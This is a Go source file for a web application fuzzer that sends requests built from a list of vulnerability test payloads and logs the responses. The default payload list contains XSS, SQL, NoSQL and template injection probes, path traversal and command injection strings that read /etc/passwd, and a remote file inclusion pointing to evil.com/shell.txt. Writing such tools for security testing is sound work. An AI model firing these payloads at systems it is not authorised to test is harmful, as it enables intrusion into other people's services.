package fuzzer

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net/http"
	"net/http/cookiejar"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// Config holds the fuzzer configuration
type Config struct {
	// Basic settings
	TargetURL    string
	Concurrency  int
	NumRequests  int
	Timeout      time.Duration
	WordlistPath string
	OutputDir    string
	Verbose      bool
	MaxWorkers   int // Maximum number of concurrent workers
	MaxPages     int // Maximum number of pages to crawl

	// Coverage settings
	UseCoverage        bool // Whether to use coverage-guided fuzzing
	UseGrammarCoverage bool // Whether to use grammar-coverage-guided fuzzing
	UseSystematic      bool // Whether to use systematic coverage-guided fuzzing
	MaxCorpus          int  // Maximum size of interesting inputs corpus (0 = unlimited)

	// Grammar settings
	MaxDepth          int  // Maximum depth for grammar derivation trees
	DuplicateContexts bool // Whether to duplicate grammar rules for context coverage

	// Attack settings
	SQLInjection bool // Whether to perform SQL injection testing

	// API settings
	APIFuzzing bool // Whether to enable API endpoint detection and fuzzing
	APISchema  bool // Whether to enable API schema inference
	APIFull    bool // Whether to enable full API testing suite

	// Testing modes
	FullAuto bool // Whether to enable all testing capabilities

	// Mutation settings
	UseMutation      bool     // Whether to use mutation-based fuzzing
	MinMutations     int      // Minimum mutations per input
	MaxMutations     int      // Maximum mutations per input
	SeedInputs       []string // Initial seed inputs for mutation
	MutationRate     float64  // Probability of mutating vs generating new (0.0-1.0)
	PreserveSessions bool     // Whether to maintain session cookies across requests
}

// DefaultConfig returns a Config with sensible defaults
func DefaultConfig(targetURL string) *Config {
	return &Config{
		TargetURL:          targetURL,
		Concurrency:        20,   // Default to 20 workers for better performance
		NumRequests:        2000, // Increased default requests
		Timeout:            10 * time.Second,
		OutputDir:          "./results",
		Verbose:            false,
		UseCoverage:        true,
		UseGrammarCoverage: true,
		MaxCorpus:          2000, // Increased corpus size
		MaxDepth:           10,
		SQLInjection:       false,
		APIFuzzing:         false,
		APISchema:          false,
		APIFull:            false,
		FullAuto:           false,
		MutationRate:       0.7,
		MaxMutations:       5,
		PreserveSessions:   true,
	}
}

// Fuzzer represents the web application fuzzer
type Fuzzer struct {
	config   *Config
	client   *http.Client
	payloads []string
	results  chan *Result
	wg       sync.WaitGroup
	logger   *log.Logger
}

// Result represents a fuzzing test result
type Result struct {
	Payload    string
	URL        string
	StatusCode int
	Response   string
	Error      error
	Duration   time.Duration
	Timestamp  time.Time
}

// New creates a new Fuzzer instance
func New(config *Config) (FuzzerInterface, error) {
	if err := validateConfig(config); err != nil {
		return nil, err
	}

	// Create output directory if it doesn't exist
	if err := os.MkdirAll(config.OutputDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create output directory: %v", err)
	}

	// Choose fuzzer type based on configuration
	if config.UseCoverage {
		if config.UseSystematic {
			return NewSystematicCoverageFuzzer(config)
		} else if config.UseGrammarCoverage {
			return NewGrammarCoverageFuzzer(config)
		}
		return NewCoverageFuzzer(config)
	}

	// Initialize logger
	logFile, err := os.Create(filepath.Join(config.OutputDir, "fuzzer.log"))
	if err != nil {
		return nil, fmt.Errorf("failed to create log file: %v", err)
	}

	logger := log.New(logFile, "", log.LstdFlags)

	// Initialize HTTP client with timeout and optional session handling
	client := &http.Client{
		Timeout: config.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if !config.PreserveSessions {
				return http.ErrUseLastResponse
			}
			if len(via) >= 10 {
				return errors.New("stopped after 10 redirects")
			}
			return nil
		},
		Jar: nil, // Will be set to CookieJar if PreserveSessions is true
	}

	if config.PreserveSessions {
		jar, err := cookiejar.New(nil)
		if err != nil {
			return nil, fmt.Errorf("failed to create cookie jar: %v", err)
		}
		client.Jar = jar
	}

	f := &Fuzzer{
		config:   config,
		client:   client,
		results:  make(chan *Result, config.Concurrency),
		logger:   logger,
		payloads: defaultPayloads(),
	}

	// Load custom wordlist if provided
	if config.WordlistPath != "" {
		payloads, err := loadWordlist(config.WordlistPath)
		if err != nil {
			return nil, fmt.Errorf("failed to load wordlist: %v", err)
		}
		f.payloads = append(f.payloads, payloads...)
	}

	return f, nil
}

// Run starts the fuzzing process
func (f *Fuzzer) Run() error {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start result processor
	go f.processResults()

	// Start worker pool
	for i := 0; i < f.config.Concurrency; i++ {
		f.wg.Add(1)
		go f.worker(ctx)
	}

	// Wait for all workers to complete
	f.wg.Wait()
	close(f.results)

	return nil
}

// worker performs the actual fuzzing
func (f *Fuzzer) worker(ctx context.Context) {
	defer f.wg.Done()

	for i := 0; i < f.config.NumRequests/f.config.Concurrency; i++ {
		select {
		case <-ctx.Done():
			return
		default:
			payload := f.payloads[i%len(f.payloads)]
			result := f.testPayload(payload)
			f.results <- result

			if f.config.Verbose {
				log.Printf("[%d] Testing: %s\n", result.StatusCode, result.URL)
			}
		}
	}
}

// testPayload sends a request with the given payload
func (f *Fuzzer) testPayload(payload string) *Result {
	start := time.Now()
	url := f.buildURL(payload)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return &Result{
			Payload:   payload,
			URL:       url,
			Error:     err,
			Timestamp: start,
		}
	}

	resp, err := f.client.Do(req)
	duration := time.Since(start)

	if err != nil {
		return &Result{
			Payload:   payload,
			URL:       url,
			Error:     err,
			Duration:  duration,
			Timestamp: start,
		}
	}
	defer resp.Body.Close()

	return &Result{
		Payload:    payload,
		URL:        url,
		StatusCode: resp.StatusCode,
		Duration:   duration,
		Timestamp:  start,
	}
}

// processResults handles the fuzzing results
func (f *Fuzzer) processResults() {
	resultsFile, err := os.Create(filepath.Join(f.config.OutputDir, "results.txt"))
	if err != nil {
		log.Printf("Error creating results file: %v", err)
		return
	}
	defer resultsFile.Close()

	for result := range f.results {
		if result.Error != nil {
			fmt.Fprintf(resultsFile, "[ERROR] %s: %v\n", result.URL, result.Error)
			continue
		}

		// Log interesting responses (non-200 status codes)
		if result.StatusCode != http.StatusOK {
			fmt.Fprintf(resultsFile, "[%d] %s (%.2fs)\n",
				result.StatusCode, result.URL, result.Duration.Seconds())
		}
	}
}

// buildURL constructs the URL with the payload
func (f *Fuzzer) buildURL(payload string) string {
	return fmt.Sprintf("%s/%s", f.config.TargetURL, payload)
}

// validateConfig checks if the configuration is valid
func validateConfig(config *Config) error {
	if config.TargetURL == "" {
		return fmt.Errorf("target URL is required")
	}
	if config.Concurrency < 1 || config.Concurrency > 100 {
		return fmt.Errorf("concurrency must be between 1 and 100")
	}
	if config.NumRequests < 1 {
		return fmt.Errorf("number of requests must be greater than 0")
	}
	if config.Timeout < 1*time.Second {
		return fmt.Errorf("timeout must be at least 1 second")
	}
	if config.MaxDepth < 1 {
		return fmt.Errorf("max depth must be greater than 0")
	}
	return nil
}

// loadWordlist loads payloads from a wordlist file
func loadWordlist(path string) ([]string, error) {
	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	// Split content into lines and filter empty lines
	var payloads []string
	for _, line := range strings.Split(string(content), "\n") {
		if line = strings.TrimSpace(line); line != "" {
			payloads = append(payloads, line)
		}
	}

	return payloads, nil
}

// defaultPayloads returns a set of default web vulnerability test payloads
func defaultPayloads() []string {
	return []string{
		// XSS payloads
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"javascript:alert(1)",

		// SQL injection payloads
		"' OR '1'='1",
		"1' ORDER BY 1--",
		"1' UNION SELECT NULL--",

		// Path traversal payloads
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"%2e%2e%2f%2e%2e%2f",

		// Command injection payloads
		"| ls -la",
		"; cat /etc/passwd",
		"& whoami",

		// Common web paths
		"admin",
		"login",
		"wp-admin",
		"phpinfo.php",
		".git/HEAD",

		// File inclusion
		"index.php?file=../../../../etc/passwd",
		"?page=http://evil.com/shell.txt",

		// NoSQL injection
		"{'$gt': ''}",
		"[$ne]=1",

		// Template injection
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
	}
}
